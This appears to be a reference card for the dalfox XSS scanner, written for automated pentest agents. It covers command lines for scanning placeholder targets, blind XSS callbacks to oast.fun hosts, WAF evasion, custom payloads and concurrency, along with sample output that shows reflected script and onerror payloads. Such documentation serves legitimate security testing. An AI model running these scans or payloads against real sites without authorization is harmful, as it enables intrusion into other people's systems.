---
tool_name: dalfox
category: exploitation
tags: [xss, cross-site-scripting, reflected-xss, stored-xss, blind-xss, waf-detection, parameter-analysis]
used_by_agents: [xss_agent, planner_agent]
---

# dalfox — Parameter Analysis & XSS Scanner

## What It Does
Modern XSS vulnerability scanner built in Go. Analyzes parameters for reflection, tests with context-aware payloads, detects WAFs, and supports blind XSS via callback. Significantly faster and more accurate than legacy XSS tools. Supports piped input from other tools (subfinder, httpx, etc.).

## Why Use Over XSSer
- Faster (Go-based, concurrent)
- Context-aware payloads (knows if reflection is in HTML, attribute, JS, etc.)
- Built-in WAF fingerprinting
- Native blind XSS support
- JSON output for parsing
- Better maintained / more accurate detection

---

## Basic Scanning

### Single URL with parameter
```bash
dalfox url "http://target.com/search?q=test"
```

### POST method
```bash
dalfox url "http://target.com/search" -X POST -d "q=test"
```

### Specify parameter to test
```bash
dalfox url "http://target.com/page?id=1&name=test" -p name
```

### With cookies/auth
```bash
dalfox url "http://target.com/search?q=test" --cookie "PHPSESSID=abc123;security=low"
dalfox url "http://target.com/search?q=test" -H "Authorization: Bearer TOKEN"
```

---

## Piped Input (from other tools)

```bash
# From a file of URLs
dalfox file targets.txt

# From stdin (pipe from other tools)
cat urls_with_params.txt | dalfox pipe

# Chain with other tools
echo "http://target.com/search?q=test" | dalfox pipe
subfinder -d target.com | httpx -path "/search?q=test" | dalfox pipe
```

---

## Blind XSS (Out-of-Band)

```bash
# Using your own callback server
dalfox url "http://target.com/search?q=test" --blind "https://your-interactsh-url.oast.fun"

# With custom blind XSS payload
dalfox url "http://target.com/feedback?comment=test" --blind "https://callback.oast.fun" -X POST -d "comment=test"
```

---

## Custom Payloads

```bash
# Add custom payloads
dalfox url "http://target.com/search?q=test" --custom-payload payloads.txt

# Custom alert value (for detection)
dalfox url "http://target.com/search?q=test" --custom-alert-value "1337"

# Only use custom payloads
dalfox url "http://target.com/search?q=test" --only-custom-payload --custom-payload payloads.txt
```

---

## WAF Detection & Bypass

```bash
# WAF detection is automatic. To skip:
dalfox url "http://target.com/search?q=test" --waf-evasion

# Use encoding for bypass
dalfox url "http://target.com/search?q=test" --encoder "urlEncode"
```

---

## Mining (Parameter Analysis)

```bash
# Analyze parameter reflection without full XSS testing
dalfox url "http://target.com/search?q=test" --mining-dict

# DOM XSS mining
dalfox url "http://target.com/search?q=test" --mining-dom
```

---

## Performance

```bash
# Worker count (concurrency)
dalfox url "http://target.com/search?q=test" -w 50

# Delay between requests (ms)
dalfox url "http://target.com/search?q=test" --delay 100

# Timeout per request (seconds)
dalfox url "http://target.com/search?q=test" --timeout 10
```

---

## Output

```bash
# JSON output (best for agent parsing)
dalfox url "http://target.com/search?q=test" --format json -o results.json

# Plain text
dalfox url "http://target.com/search?q=test" -o results.txt

# Only show confirmed vulnerabilities
dalfox url "http://target.com/search?q=test" --only-poc

# Silence mode (minimal output)
dalfox url "http://target.com/search?q=test" --silence
```

---

## Proxy

```bash
dalfox url "http://target.com/search?q=test" --proxy http://127.0.0.1:8080
```

---

## Output Interpretation

### XSS found:
```
[*] Using single target mode
[*] Target URL: http://target.com/search?q=test
[*] Checking WAF...
[*] WAF: Not Detected
[*] Testing parameter: q
[POC][R][GET] http://target.com/search?q="><script>alert(1)</script>
[POC][V][GET] http://target.com/search?q="><img/src/onerror=alert(1)>
```
**Success indicators**:
- `[POC]` — Proof of Concept found (confirmed XSS)
- `[R]` — Reflected XSS
- `[V]` — Verified (payload confirmed in response)
- `[G]` — Grep-based detection

### WAF detected:
```
[*] WAF: Cloudflare detected
```

### JSON output:
```json
{
  "type": "XSS",
  "inject_type": "inHTML-URL",
  "poc_type": "plain",
  "method": "GET",
  "data": "http://target.com/search?q=\"><script>alert(1)</script>",
  "param": "q",
  "payload": "\"><script>alert(1)</script>",
  "evidence": "found reflected"
}
```

### No XSS found:
```
[*] Finish scanning 47 payloads on parameter q
[*] No vulnerability found
```
**Failure indicators**: `No vulnerability found`, no `[POC]` lines.

---

## Common Flags Reference

| Flag | Purpose |
|------|---------|
| `url` | Scan single URL mode |
| `file` | Scan URLs from file |
| `pipe` | Scan from stdin pipe |
| `-p` | Specific parameter to test |
| `-X` | HTTP method (GET, POST) |
| `-d` | POST body data |
| `--cookie` | Cookie header |
| `-H` | Custom header |
| `--blind` | Blind XSS callback URL |
| `--custom-payload` | Custom payload file |
| `--custom-alert-value` | Custom alert value for detection |
| `--waf-evasion` | Enable WAF bypass techniques |
| `--encoder` | Payload encoding method |
| `--mining-dict` | Parameter reflection analysis |
| `--mining-dom` | DOM-based XSS source analysis |
| `-w` | Worker count (concurrency) |
| `--delay` | Delay between requests (ms) |
| `--timeout` | Request timeout (seconds) |
| `--format` | Output format (json, plain) |
| `-o` | Output file |
| `--only-poc` | Show only confirmed POCs |
| `--silence` | Minimal output |
| `--proxy` | Proxy URL |
